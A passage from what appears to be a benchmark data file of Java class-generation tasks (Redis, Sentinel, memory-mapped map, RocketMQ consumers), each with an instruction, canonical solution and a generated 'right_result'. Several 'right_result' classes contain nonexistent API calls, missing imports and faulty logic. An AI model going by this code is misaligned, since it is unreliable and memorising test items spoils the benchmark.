key, String value) {\n        try (Connection connection = getConnection()) {\n            connection.sendCommand(Command.SET, key, value);\n            String response = connection.getStatusCodeReply();\n            if (!\"OK\".equals(response)) {\n                throw new JedisException(\"Failed to set key: \" + key);\n            }\n        }\n    }\n\n    public String getValue(String key) {\n        try (Connection connection = getConnection()) {\n            connection.sendCommand(Command.GET, key);\n            return connection.getBulkReply();\n        }\n    }\n\n    public void close() {\n        if (jedisPool != null) {\n            jedisPool.close();\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 37,
    "right_result": "import redis.clients.jedis.HostAndPort;\nimport redis.clients.jedis.DefaultJedisClientConfig;\nimport redis.clients.jedis.JedisPooled;\nimport redis.clients.jedis.Connection;\nimport org.apache.commons.pool2.impl.GenericObjectPoolConfig;\n\npublic class RedisConnectionManager {\n    private JedisPooled jedisPool;\n    private GenericObjectPoolConfig<Connection> poolConfig;\n    private RedisCredentialsProvider credentialsProvider;\n\n    public RedisConnectionManager(HostAndPort hostAndPort, DefaultJedisClientConfig clientConfig) {\n        this(hostAndPort, clientConfig, new GenericObjectPoolConfig<>());\n    }\n\n    public RedisConnectionManager(HostAndPort hostAndPort, DefaultJedisClientConfig clientConfig, GenericObjectPoolConfig<Connection> poolConfig) {\n        this.poolConfig = poolConfig;\n        this.jedisPool = new JedisPooled(hostAndPort, clientConfig, poolConfig);\n        this.credentialsProvider = new RedisCredentialsProvider();\n    }\n\n    public Connection getConnection() {\n        return jedisPool.borrowObject();\n    }\n\n    public void closeConnection(Connection connection) {\n        jedisPool.returnObject(connection);\n    }\n\n    public void setCredentialsProvider(RedisCredentialsProvider credentialsProvider) {\n        this.credentialsProvider = credentialsProvider;\n    }\n\n    public void executeCommand(String key, String value) {\n        Connection conn = getConnection();\n        try {\n            conn.set(key.getBytes(), value.getBytes());\n        } finally {\n            closeConnection(conn);\n        }\n    }\n\n    public String getValue(String key) {\n        Connection conn = getConnection();\n        try {\n            byte[] valueBytes = conn.get(key.getBytes());\n            return new String(valueBytes);\n        } finally {\n            closeConnection(conn);\n        }\n    }\n\n    public void close() {\n        jedisPool.close();\n    }\n}"
  },
  {
    "Task_id": 355,
    "Instruction": "Task Description: Create a Java class that provides functionality to connect to Redis using Unix domain sockets, perform basic Redis operations, and manage connection lifecycle.\n\nClass Description: The RedisSocketConnector class enables interaction with Redis server through Unix domain sockets. It handles connection establishment, basic key-value operations, and proper resource cleanup. The class also includes utility methods for Redis URI creation and socket support detection.\n\nAttributes:\n- redisClient: RedisClient - The main Redis client instance used for connections\n- connection: StatefulRedisConnection<String, String> - The active Redis connection\n\nMethods:\n- connect(RedisURI redisURI) -> void - Establishes a connection to Redis using the provided URI\n- performRedisAction(String key, String value) -> void - Performs a set and get operation on the specified key-value pair\n- close() -> void - Closes the Redis connection and shuts down the client\n- createSocketRedisUri(String socketPath) -> RedisURI - Creates a Redis URI for socket connection from the given path\n- isSupported() -> boolean - Checks if domain sockets are supported on the current system",
    "Canonical_solution": "import io.lettuce.core.RedisClient;\nimport io.lettuce.core.RedisURI;\nimport io.lettuce.core.api.StatefulRedisConnection;\nimport io.lettuce.core.api.sync.RedisCommands;\nimport io.lettuce.core.resource.Transports;\nimport io.lettuce.test.resource.TestClientResources;\nimport io.netty.util.internal.SystemPropertyUtil;\nimport java.io.File;\nimport java.io.IOException;\nimport java.util.Locale;\n\npublic class RedisSocketConnector {\n\n    private RedisClient redisClient;\n    private StatefulRedisConnection<String, String> connection;\n\n    public void connect(RedisURI redisURI) {\n        redisClient = RedisClient.create(TestClientResources.get(), redisURI);\n        connection = redisClient.connect();\n    }\n\n    public void performRedisAction(String key, String value) {\n        RedisCommands<String, String> syncCommands = connection.sync();\n        syncCommands.set(key, value);\n        String result = syncCommands.get(key);\n    }\n\n    public void close() {\n        if (connection != null) {\n            connection.close();\n        }\n        if (redisClient != null) {\n            redisClient.shutdown();\n        }\n    }\n\n    public static RedisURI createSocketRedisUri(String socketPath) throws IOException {\n        File file = new File(socketPath).getCanonicalFile();\n        return RedisURI.create(RedisURI.URI_SCHEME_REDIS_SOCKET + \"://\" + file.getCanonicalPath());\n    }\n\n    public static boolean isSupported() {\n        String osName = SystemPropertyUtil.get(\"os.name\").toLowerCase(Locale.UK).trim();\n        return Transports.NativeTransports.isDomainSocketSupported();\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 37,
    "right_result": "import io.lettuce.core.RedisClient;\nimport io.lettuce.core.api.StatefulRedisConnection;\nimport io.lettuce.core.api.RedisAPI;\nimport io.lettuce.core.RedisURI;\nimport java.net.URI;\nimport java.util.concurrent.atomic.AtomicBoolean;\n\npublic class RedisSocketConnector {\n    private RedisClient redisClient;\n    private StatefulRedisConnection<String, String> connection;\n\n    public void connect(RedisURI redisURI) {\n        this.redisClient = RedisClient.create(redisURI);\n        this.connection = this.redisClient.connect();\n    }\n\n    public void performRedisAction(String key, String value) {\n        connection.sync().set(key, value);\n        String result = connection.sync().get(key);\n        System.out.println(\"Set key: \" + key + \" to value: \" + value + \", retrieved: \" + result);\n    }\n\n    public void close() {\n        if (connection != null) {\n            connection.close();\n        }\n        if (redisClient != null) {\n            redisClient.shutdown();\n        }\n    }\n\n    public RedisURI createSocketRedisUri(String socketPath) {\n        return RedisURI.create(\"redis://\" + socketPath);\n    }\n\n    public boolean isSupported() {\n        return System.getProperty(\"os.name\").toLowerCase().startsWith(\"linux\") ||\n               System.getProperty(\"os.name\").toLowerCase().startsWith(\"mac\") ||\n               System.getProperty(\"os.name\").toLowerCase().startsWith(\"unix\");\n    }\n}"
  },
  {
    "Task_id": 356,
    "Instruction": "Task Description: Implement a Redis Sentinel connection provider class in Java that manages connections to a Redis master node through Sentinel monitoring, including automatic failover handling.\n\nClass Description: SentineledConnectionProvider is a class that provides managed connections to a Redis master node in a Sentinel-monitored environment. It automatically discovers the current master through Sentinel nodes and maintains a connection pool to it. The class also includes a listener thread that monitors for master failover events and updates the connection pool accordingly.\n\nAttributes:\n- currentMaster: [HostAndPort] - The current master node's host and port\n- pool: [ConnectionPool] - The connection pool to the current master node\n- masterName: [String] - The name of the Redis master as configured in Sentinel\n- masterClientConfig: [JedisClientConfig] - Configuration for connections to the master node\n- sentinelClientConfig: [JedisClientConfig] - Configuration for connections to Sentinel nodes\n\nMethods:\n- SentineledConnectionProvider([String] masterName, [JedisClientConfig] masterClientConfig, [Set<HostAndPort>] sentinels, [JedisClientConfig] sentinelClientConfig) -> [void] - Constructor that initializes the connection provider with master name, configurations, and Sentinel nodes\n- getConnection() -> [Connection] - Retrieves a connection from the pool to the current master node\n- initMaster([HostAndPort] master) -> [void] - Initializes or updates the connection pool to the specified master node\n- initSentinels([Set<HostAndPort>] sentinels) -> [HostAndPort] - Discovers the current master node through Sentinel nodes\n- SentinelListener([HostAndPort] node) -> [void] - Nested class constructor for Sentinel listener thread\n- run() -> [void] - Main execution method of the Sentinel listener thread (overrides Thread.run())\n- shutdown() -> [void] - Shuts down the Sentinel listener thread",
    "Canonical_solution": "import org.slf4j.Logger;\nimport org.slf4j.LoggerFactory;\nimport redis.clients.jedis.Connection;\nimport redis.clients.jedis.ConnectionPool;\nimport redis.clients.jedis.HostAndPort;\nimport redis.clients.jedis.Jedis;\nimport redis.clients.jedis.JedisClientConfig;\nimport redis.clients.jedis.JedisPubSub;\nimport redis.clients.jedis.exceptions.JedisConnectionException;\nimport redis.clients.jedis.exceptions.JedisException;\nimport redis.clients.jedis.util.IOUtils;\n\nimport java.util.Set;\nimport java.util.concurrent.atomic.AtomicBoolean;\n\npublic class SentineledConnectionProvider {\n\n  private static final Logger LOG = LoggerFactory.getLogger(SentineledConnectionProvider.class);\n\n  private volatile HostAndPort currentMaster;\n  private volatile ConnectionPool pool;\n  private final String masterName;\n  private final JedisClientConfig masterClientConfig;\n  private final JedisClientConfig sentinelClientConfig;\n\n  public SentineledConnectionProvider(String masterName, final JedisClientConfig masterClientConfig,\n      Set<HostAndPort> sentinels, final JedisClientConfig sentinelClientConfig) {\n    this.masterName = masterName;\n    this.masterClientConfig = masterClientConfig;\n    this.sentinelClientConfig = sentinelClientConfig;\n\n    HostAndPort master = initSentinels(sentinels);\n    initMaster(master);\n  }\n\n  public Connection getConnection() {\n    return pool.getResource();\n  }\n\n  private void initMaster(HostAndPort master) {\n    if (!master.equals(currentMaster)) {\n      currentMaster = master;\n      pool = new ConnectionPool(currentMaster, masterClientConfig);\n      LOG.info(\"Created connection pool to master at {}.\", master);\n    }\n  }\n\n  private HostAndPort initSentinels(Set<HostAndPort> sentinels) {\n    HostAndPort master = null;\n    boolean sentinelAvailable = false;\n\n    for (HostAndPort sentinel : sentinels) {\n      try (Jedis jedis = new Jedis(sentinel, sentinelClientConfig)) {\n        List<String> masterAddr = jedis.sentinelGetMasterAddrByName(masterName);\n        sentinelAvailable = true;\n\n        if (masterAddr == null || masterAddr.size() != 2) {\n          continue;\n        }\n\n        master = new HostAndPort(masterAddr.get(0), Integer.parseInt(masterAddr.get(1)));\n        break;\n      } catch (JedisException e) {\n        LOG.warn(\"Could not get master address from {}.\", sentinel, e);\n      }\n    }\n\n    if (master == null) {\n      if (sentinelAvailable) {\n        throw new JedisException(\"Can connect to sentinel, but \" + masterName + \" seems to be not monitored.\");\n      } else {\n        throw new JedisConnectionException(\"All sentinels down, cannot determine where \" + masterName + \" is running.\");\n      }\n    }\n\n    return master;\n  }\n\n  protected class SentinelListener extends Thread {\n    protected final HostAndPort node;\n    protected volatile Jedis sentinelJedis;\n    protected AtomicBoolean running = new AtomicBoolean(false);\n\n    public SentinelListener(HostAndPort node) {\n      this.node = node;\n    }\n\n    @Override\n    public void run() {\n      running.set(true);\n\n      while (running.get()) {\n        try {\n          sentinelJedis = new Jedis(node, sentinelClientConfig);\n          sentinelJedis.subscribe(new JedisPubSub() {\n            @Override\n            public void onMessage(String channel, String message) {\n              String[] switchMasterMsg = message.split(\" \");\n              if (switchMasterMsg.length > 3 && masterName.equals(switchMasterMsg[0])) {\n                initMaster(new HostAndPort(switchMasterMsg[3], Integer.parseInt(switchMasterMsg[4])));\n              }\n            }\n          }, \"+switch-master\");\n        } catch (JedisException e) {\n          if (running.get()) {\n            try {\n              Thread.sleep(5000);\n            } catch (InterruptedException se) {\n              LOG.error(\"Sleep interrupted.\", se);\n            }\n          }\n        } finally {\n          IOUtils.closeQuietly(sentinelJedis);\n        }\n      }\n    }\n\n    public void shutdown() {\n      running.set(false);\n      if (sentinelJedis != null) {\n        sentinelJedis.close();\n      }\n    }\n  }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 37,
    "right_result": "```java\nimport redis.clients.jedis.Jedis;\nimport redis.clients.jedis.JedisClientConfig;\nimport redis.clients.jedis.HostAndPort;\nimport redis.clients.jedis.ConnectionPool;\nimport java.util.Set;\nimport java.util.concurrent.ThreadFactory;\nimport java.util.concurrent.Executors;\nimport java.util.concurrent.ThreadPoolExecutor;\nimport java.util.concurrent.TimeUnit;\n\npublic class SentineledConnectionProvider {\n    private HostAndPort currentMaster;\n    private ConnectionPool pool;\n    private String masterName;\n    private JedisClientConfig masterClientConfig;\n    private JedisClientConfig sentinelClientConfig;\n    private Thread sentinelListenerThread;\n\n    public SentineledConnectionProvider(String masterName, JedisClientConfig masterClientConfig, Set<HostAndPort> sentinels, JedisClientConfig sentinelClientConfig) {\n        this.masterName = masterName;\n        this.masterClientConfig = masterClientConfig;\n        this.sentinelClientConfig = sentinelClientConfig;\n        this.currentMaster = null;\n        this.pool = null;\n        this.sentinelListenerThread = new Thread(new SentinelListener(sentinels));\n        sentinelListenerThread.start();\n        initSentinels(sentinels);\n    }\n\n    public Connection getConnection() {\n        if (pool == null || pool.isEmpty()) {\n            initMaster(currentMaster);\n        }\n        return pool.getConnection();\n    }\n\n    public void initMaster(HostAndPort master) {\n        if (pool != null) {\n            pool.close();\n        }\n        pool = new ConnectionPool(masterClientConfig, master);\n    }\n\n    public HostAndPort initSentinels(Set<HostAndPort> sentinels) {\n        for (HostAndPort sentinel : sentinels) {\n            try (Jedis jedis = new Jedis(sentinel.getHost(), sentinel.getPort(), sentinelClientConfig.getConnectionTimeout(), sentinelClientConfig.getSocketTimeout())) {\n                String masterAddress = jedis.sentinelGetMasterAddrBy_name(masterName);\n                if (masterAddress != null) {\n                    String[] parts = masterAddress.split(\":\");\n                    return new HostAndPort(parts[0], Integer.parseInt(parts[1]));\n                }\n            } catch (Exception e) {\n                // Handle exception, e.g., log or retry\n            }\n        }\n        return null;\n    }\n\n    private class SentinelListener implements Runnable {\n        private final Set<HostAndPort> sentinels;\n\n        public SentinelListener(Set<HostAndPort> sentinels) {\n            this.sentinels = sentinels;\n        }\n\n        @Override\n        public void run() {\n            while (true) {\n                HostAndPort newMaster = initSentinels(sentinels);\n                if (newMaster != null && !newMaster.equals(currentMaster)) {\n                    currentMaster = newMaster;\n                    initMaster(currentMaster);\n                }\n                try {\n                    Thread.sleep(5000);\n                } catch (InterruptedException e) {\n                    Thread.currentThread().interrupt();\n                    break;\n                }\n            }\n        }\n    }\n\n    public void shutdown() {\n        if (sentinelListenerThread != null) {\n            sentinelListenerThread.interrupt();\n        }\n        if (pool != null) {\n            pool.close();\n        }\n    }\n}\n```"
  },
  {
    "Task_id": 36,
    "Instruction": "Task Description: Implement a memory-mapped file-based key-value store for long-to-long mappings using Java NIO's FileChannel and MappedByteBuffer.\n\nClass Description: ArrayLongLongMapMmap provides a memory-efficient way to store and retrieve long-to-long mappings using memory-mapped files. It segments large files into manageable chunks for efficient random access.\n\nAttributes:\n- path: Path - The filesystem path where the memory-mapped file will be stored\n- writeChannel: FileChannel - Channel for writing to the file during initialization\n- segmentsArray: MappedByteBuffer[] - Array of memory-mapped buffers for reading data\n- readChannel: FileChannel - Channel for reading from the file after initialization\n\nMethods:\n- ArrayLongLongMapMmap(Path path, boolean madvise) - Constructor - Initializes the map with the given file path\n- init() -> void - Initializes the memory mapping by closing the write channel and opening read channels with segmented mappings\n- get(long key) -> long - Retrieves the value associated with the given key from memory-mapped segments\n- close() -> void - Cleans up resources including unmapping buffers and closing channels, then deletes the file\n\nThe implementation uses memory-mapped files (1<<27 byte segments) for efficient random access to large datasets while minimizing memory usage. The close() method ensures proper resource cleanup including buffer unmapping and file deletion.",
    "Canonical_solution": "import com.onthegomap.planetiler.util.ByteBufferUtil;\nimport com.onthegomap.planetiler.util.FileUtils;\nimport java.io.IOException;\nimport java.io.UncheckedIOException;\nimport java.nio.ByteBuffer;\nimport java.nio.MappedByteBuffer;\nimport java.nio.channels.FileChannel;\nimport java.nio.file.Path;\nimport java.nio.file.StandardOpenOption;\nimport java.util.concurrent.Semaphore;\n\nclass ArrayLongLongMapMmap {\n\n  private final Path path;\n  private FileChannel writeChannel;\n  private MappedByteBuffer[] segmentsArray;\n  private FileChannel readChannel = null;\n\n  ArrayLongLongMapMmap(Path path, boolean madvise) {\n    this.path = path;\n    try {\n      writeChannel = FileChannel.open(path, StandardOpenOption.WRITE, StandardOpenOption.CREATE);\n    } catch (IOException e) {\n      throw new UncheckedIOException(e);\n    }\n  }\n\n  public void init() {\n    try {\n      writeChannel.close();\n      readChannel = FileChannel.open(path, StandardOpenOption.READ);\n      segmentsArray = ByteBufferUtil.mapFile(readChannel, readChannel.size(), 1L << 27, false, null);\n    } catch (IOException e) {\n      throw new UncheckedIOException(e);\n    }\n  }\n\n  @Override\n  public long get(long key) {\n    long byteOffset = key << 3;\n    int idx = (int) (byteOffset >>> 27);\n    if (idx >= segmentsArray.length) {\n      return 0;\n    }\n    MappedByteBuffer mappedByteBuffer = segmentsArray[idx];\n    if (mappedByteBuffer == null) {\n      return 0;\n    }\n    int offset = (int) (byteOffset & ((1L << 27) - 1));\n    return mappedByteBuffer.getLong(offset);\n  }\n\n  @Override\n  public void close() throws IOException {\n    if (segmentsArray != null) {\n      ByteBufferUtil.free(segmentsArray);\n      segmentsArray = null;\n    }\n    if (writeChannel != null) {\n      writeChannel.close();\n      writeChannel = null;\n    }\n    if (readChannel != null) {\n      readChannel.close();\n      readChannel = null;\n    }\n    FileUtils.delete(path);\n  }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 9,
    "right_result": "```java\nimport java.io.IOException;\nimport java.nio.MappedByteBuffer;\nimport java.nio.channels.FileChannel;\nimport java.nio.file.Path;\nimport java.nio.file.StandardOpenOption;\n\npublic class ArrayLongLongMapMmap {\n    private final Path path;\n    private FileChannel writeChannel;\n    private MappedByteBuffer[] segmentsArray;\n    private FileChannel readChannel;\n\n    public ArrayLongLongMapMmap(Path path, boolean madvise) {\n        this.path = path;\n        try {\n            this.writeChannel = FileChannel.open(path, StandardOpenOption.CREATE, StandardOpenOption.WRITE);\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n\n    public void init() throws IOException {\n        if (writeChannel != null) {\n            writeChannel.close();\n        }\n        readChannel = FileChannel.open(path, StandardOpenOption.READ);\n        int segmentSize = 1 << 27;\n        int numSegments = (int) (readChannel.size() + segmentSize - 1) / segmentSize;\n        segmentsArray = new MappedByteBuffer[numSegments];\n        for (int i = 0; i < numSegments; i++) {\n            segmentsArray[i] = readChannel.map(FileChannel.MapMode.READ_ONLY, i * segmentSize, segmentSize);\n        }\n    }\n\n    public long get(long key) {\n        int entriesPerSegment = (1 << 27) / 16;\n        int entryIndex = (int) (key % entriesPerSegment);\n        int segmentIndex = entryIndex / entriesPerSegment;\n        MappedByteBuffer segment = segmentsArray[segmentIndex];\n        long offset = entryIndex * 16;\n        return segment.getLong(offset + 8);\n    }\n\n    public void close() throws IOException {\n        if (segmentsArray != null) {\n            for (MappedByteBuffer seg : segmentsArray) {\n                seg.force();\n                seg.close();\n            }\n        }\n        if (readChannel != null) {\n            readChannel.close();\n        }\n        if (writeChannel != null) {\n            writeChannel.close();\n        }\n        Files.delete(path);\n    }\n}\n```"
  },
  {
    "Task_id": 361,
    "Instruction": "Task Description: Implement a RocketMQ push consumer in Java that subscribes to a specific topic, processes incoming messages asynchronously, and manages consumer lifecycle operations.\n\nClass Description: LMQPushConsumer is a Java class that encapsulates the functionality of a RocketMQ push consumer. It handles the initialization, startup, and shutdown of the consumer, as well as message consumption from a specified topic using a concurrent message listener.\n\nAttributes:\n- CLUSTER_NAME: [String] - The name of the RocketMQ cluster\n- BROKER_NAME: [String] - The name of the broker\n- TOPIC: [String] - The parent topic name\n- LMQ_TOPIC: [String] - The specific LMQ topic to subscribe to\n- CONSUMER_GROUP: [String] - The consumer group identifier\n- NAMESRV_ADDR: [String] - The NameServer address\n- BROKER_ADDR_MAP: [HashMap<Long, String>] - Mapping of broker IDs to their addresses\n- consumer: [DefaultMQPushConsumer] - The RocketMQ push consumer instance\n\nMethods:\n- initialize(): [void] - Initializes the consumer with configuration settings, subscription, and message listener\n  - Input: None\n  - Output: None\n  - Throws: MQClientException if initialization fails\n- start(): [void] - Starts the consumer and updates topic route information\n  - Input: None\n  - Output: None\n  - Throws: MQClientException if startup fails\n- shutdown(): [void] - Shuts down the consumer gracefully\n  - Input: None\n  - Output: None",
    "Canonical_solution": "import com.google.common.collect.Lists;\nimport java.util.Arrays;\nimport java.util.HashMap;\nimport java.util.HashSet;\nimport java.util.List;\nimport org.apache.rocketmq.client.consumer.DefaultMQPushConsumer;\nimport org.apache.rocketmq.client.consumer.listener.ConsumeConcurrentlyContext;\nimport org.apache.rocketmq.client.consumer.listener.ConsumeConcurrentlyStatus;\nimport org.apache.rocketmq.client.consumer.listener.MessageListenerConcurrently;\nimport org.apache.rocketmq.client.exception.MQClientException;\nimport org.apache.rocketmq.common.MixAll;\nimport org.apache.rocketmq.common.consumer.ConsumeFromWhere;\nimport org.apache.rocketmq.common.message.MessageExt;\nimport org.apache.rocketmq.common.message.MessageQueue;\nimport org.apache.rocketmq.remoting.protocol.route.BrokerData;\nimport org.apache.rocketmq.remoting.protocol.route.TopicRouteData;\n\npublic class LMQPushConsumer {\n    public static final String CLUSTER_NAME = \"DefaultCluster\";\n    public static final String BROKER_NAME = \"broker-a\";\n    public static final String TOPIC = \"TopicLMQParent\";\n    public static final String LMQ_TOPIC = MixAll.LMQ_PREFIX + \"123\";\n    public static final String CONSUMER_GROUP = \"CID_LMQ_1\";\n    public static final String NAMESRV_ADDR = \"127.0.0.1:9876\";\n    public static final HashMap<Long, String> BROKER_ADDR_MAP = new HashMap<Long, String>() {\n        {\n            put(MixAll.MASTER_ID, \"127.0.0.1:10911\");\n        }\n    };\n\n    private DefaultMQPushConsumer consumer;\n\n    public void initialize() throws MQClientException {\n        consumer = new DefaultMQPushConsumer(CONSUMER_GROUP);\n        consumer.setNamesrvAddr(NAMESRV_ADDR);\n        consumer.subscribe(LMQ_TOPIC, \"*\");\n        consumer.setConsumeFromWhere(ConsumeFromWhere.CONSUME_FROM_FIRST_OFFSET);\n        consumer.registerMessageListener(new MessageListenerConcurrently() {\n            @Override\n            public ConsumeConcurrentlyStatus consumeMessage(List<MessageExt> msgs, ConsumeConcurrentlyContext context) {\n                System.out.printf(\"%s Receive New Messages: %s %n\", Thread.currentThread().getName(), msgs);\n                return ConsumeConcurrentlyStatus.CONSUME_SUCCESS;\n            }\n        });\n    }\n\n    public void start() throws MQClientException {\n        consumer.start();\n        consumer.getDefaultMQPushConsumerImpl().getmQClientFactory().updateTopicRouteInfoFromNameServer(TOPIC);\n\n        final TopicRouteData topicRouteData = new TopicRouteData();\n        final BrokerData brokerData = new BrokerData();\n        brokerData.setCluster(CLUSTER_NAME);\n        brokerData.setBrokerName(BROKER_NAME);\n        brokerData.setBrokerAddrs(BROKER_ADDR_MAP);\n        topicRouteData.setBrokerDatas(Lists.newArrayList(brokerData));\n        consumer.getDefaultMQPushConsumerImpl().getmQClientFactory().getTopicRouteTable().put(LMQ_TOPIC, topicRouteData);\n        consumer.getDefaultMQPushConsumerImpl().updateTopicSubscribeInfo(LMQ_TOPIC,\n            new HashSet<>(Arrays.asList(new MessageQueue(LMQ_TOPIC, BROKER_NAME, (int) MixAll.LMQ_QUEUE_ID))));\n        consumer.getDefaultMQPushConsumerImpl().getmQClientFactory().doRebalance();\n    }\n\n    public void shutdown() {\n        consumer.shutdown();\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 43,
    "right_result": "import org.apache.rocketmq.client.consumer.DefaultMQPushConsumer;\nimport org.apache.rocketmq.client.consumer.listener.*;\nimport org.apache.rocketmq.common.message.MessageExt;\nimport java.util.HashMap;\nimport java.util.Map;\n\npublic class LMQPushConsumer {\n    private final String CLUSTER_NAME;\n    private final String BROKER_NAME;\n    private final String TOPIC;\n    private final String LMQ_TOPIC;\n    private final String CONSUMER_GROUP;\n    private final String NAMESRV_ADDR;\n    private final HashMap<Long, String> BROKER_ADDR_MAP;\n    private DefaultMQPushConsumer consumer;\n\n    public LMQPushConsumer(String clusterName, String brokerName, String topic, String lmqTopic, String consumerGroup, String namesrvAddr, HashMap<Long, String> brokerAddrMap) {\n        this.CLUSTER_NAME = clusterName;\n        this.BROKER_NAME = brokerName;\n        this.TOPIC = topic;\n        this.LMQ_TOPIC = lmqTopic;\n        this.CONSUMER_GROUP = consumerGroup;\n        this.NAMESRV_ADDR = namesrvAddr;\n        this.BROKER_ADDR_MAP = brokerAddrMap;\n    }\n\n    public void initialize() throws MQClientException {\n        consumer = new DefaultMQPushConsumer(CONSUMER_GROUP);\n        consumer.setClusterName(CLUSTER_NAME);\n        consumer.setBrokerName(BROKER_NAME);\n        consumer.setNamesrvAddr(NAMESRV_ADDR);\n        consumer.subscribe(LMQ_TOPIC, \"*\");\n        consumer.registerMessageListener((List<MessageExt> messages, ConsumeContext context) -> {\n            for (MessageExt message : messages) {\n                System.out.println(\"Received message: \" + new String(message.getBody()));\n            }\n            return ConsumeResult.CONSUME_SUCCESS;\n        });\n    }\n\n    public void start() throws MQClientException {\n        consumer.start();\n    }\n\n    public void shutdown() {\n        if (consumer != null) {\n            consumer.shutdown();\n        }\n    }\n}"
  },
  {
    "Task_id": 369,
    "Instruction": "Task Description: Create a Java class that implements a RocketMQ push consumer to subscribe to messages from a specified topic and process them asynchronously.\n\nClass Description: The PushConsumer class is a RocketMQ message consumer that uses push mode to receive messages from a message queue. It handles message subscription, listener registration, and consumer lifecycle management.\n\nAttributes:\n- consumer: DefaultMQPushConsumer - The core RocketMQ push consumer instance that handles message consumption\n\nMethods:\n- PushConsumer(String consumerGroup, String namesrvAddr) -> void - Constructor that initializes the consumer with a consumer group and NameServer address\n- subscribe(String topic, String subExpression) -> void - Subscribes to a specific topic with optional tag filtering\n- registerMessageListener(MessageListenerConcurrently listener) -> void - Registers a message listener to handle incoming messages\n- start() -> void - Starts the consumer to begin receiving messages\n- shutdown() -> void - Shuts down the consumer gracefully\n\nNested Class:\n- SimpleMessageListener: MessageListenerConcurrently - A basic message listener implementation that prints received messages\n  Methods:\n  - consumeMessage(List<MessageExt> msgs, ConsumeConcurrentlyContext context) -> ConsumeConcurrentlyStatus - Processes received messages and returns consumption status",
    "Canonical_solution": "import org.apache.rocketmq.client.consumer.DefaultMQPushConsumer;\nimport org.apache.rocketmq.client.consumer.listener.ConsumeConcurrentlyContext;\nimport org.apache.rocketmq.client.consumer.listener.ConsumeConcurrentlyStatus;\nimport org.apache.rocketmq.client.consumer.listener.MessageListenerConcurrently;\nimport org.apache.rocketmq.client.exception.MQClientException;\nimport org.apache.rocketmq.common.consumer.ConsumeFromWhere;\nimport org.apache.rocketmq.common.message.MessageExt;\nimport org.apache.rocketmq.common.protocol.heartbeat.MessageModel;\n\nimport java.util.List;\n\npublic class PushConsumer {\n\n    private DefaultMQPushConsumer consumer;\n\n    public PushConsumer(String consumerGroup, String namesrvAddr) throws MQClientException {\n        consumer = new DefaultMQPushConsumer(consumerGroup);\n        consumer.setNamesrvAddr(namesrvAddr);\n        consumer.setConsumeFromWhere(ConsumeFromWhere.CONSUME_FROM_FIRST_OFFSET);\n        consumer.setMessageModel(MessageModel.BROADCASTING);\n    }\n\n    public void subscribe(String topic, String subExpression) throws MQClientException {\n        consumer.subscribe(topic, subExpression);\n    }\n\n    public void registerMessageListener(MessageListenerConcurrently listener) {\n        consumer.registerMessageListener(listener);\n    }\n\n    public void start() throws MQClientException {\n        consumer.start();\n    }\n\n    public void shutdown() {\n        consumer.shutdown();\n    }\n\n    public static class SimpleMessageListener implements MessageListenerConcurrently {\n        @Override\n        public ConsumeConcurrentlyStatus consumeMessage(List<MessageExt> msgs,\n                                                      ConsumeConcurrentlyContext context) {\n            System.out.printf(Thread.currentThread().getName() + \" Receive New Messages: \" + msgs + \"%n\");\n            return ConsumeConcurrentlyStatus.CONSUME_SUCCESS;\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 43,
    "right_result": "import org.apache.rocketmq.client.consumer.DefaultMQPushConsumer;\nimport org.apache.rocketmq.client.consumer.MessageListenerConcurrently;\nimport org.apache.rocketmq.common.message.MessageExt;\nimport org.apache.rocketmq.client.consumer.ConsumeConcurrentlyStatus;\nimport java.util.List;\n\npublic class PushConsumer {\n    private DefaultMQPushConsumer consumer;\n\n    public PushConsumer(String consumerGroup, String namesrvAddr) {\n        consumer = new DefaultMQPushConsumer(consumerGroup);\n        consumer.setNamesrvAddr(namesrvAddr);\n    }\n\n    public void subscribe(String topic, String subExpression) {\n        consumer.subscribe(topic, subExpression);\n    }\n\n    public void registerMessageListener(MessageListenerConcurrently listener) {\n        consumer.registerMessageListener(listener);\n    }\n\n    public void start() {\n        consumer.start();\n    }\n\n    public void shutdown() {\n        consumer.shutdown();\n    }\n\n    public static class SimpleMessageListener implements MessageListenerConcurrently {\n        @Override\n        public ConsumeConcurrentlyStatus consumeMessage(List<MessageExt> msgs, ConsumeConcurrentlyContext context) {\n            System.out.println(\"Received messages: \" + msgs);\n            return ConsumeConcurrentlyStatus.CONSUME_SUCCESS;\n        }\n    }\n}"
  },
  {
    "Task_id": 372,
    "Instruction": "Task Description: Create a Java class that implements a RocketMQ consumer to asynchronously process messages from a specified topic, handling message consumption with retry logic for failed messages.\n\nClass Description: The PlanConsumer class is a Spring component that initializes and manages a RocketMQ push consumer. It subscribes to a specific topic, processes incoming messages, and implements retry logic for failed message consumption. The consumer is configured to start automatically after bean initialization.\n\nAttributes:\n- consumerGroup: String - The consumer group name for the RocketMQ consumer, injected from properties\n- namesrvAddr: String - The NameServer address for RocketMQ, injected from properties\n- logger: Logger - SLF4J logger instance for logging messages and errors\n\nMethods:\n- defaultMQPushConsumer(): void - Initializes and starts the RocketMQ consumer. This method is automatically called after bean construction (@PostConstruct). It:\n  1. Creates a DefaultMQPushConsumer instance\n  2. Configures NameServer address\n  3. Subscribes to the specified topic with wildcard tag filter\n  4. Sets consumption offset strategy\n  5. Registers a concurrent message listener\n  6. Starts the consumer\n  The message listener processes messages, logs successful consumption, and implements retry logic (up to 3 attempts) for failed messages.\n\nInput: None (Configuration is injected via @Value annotations)\n\nOutput: None (The consumer runs continuously, processing messages as they arrive)",
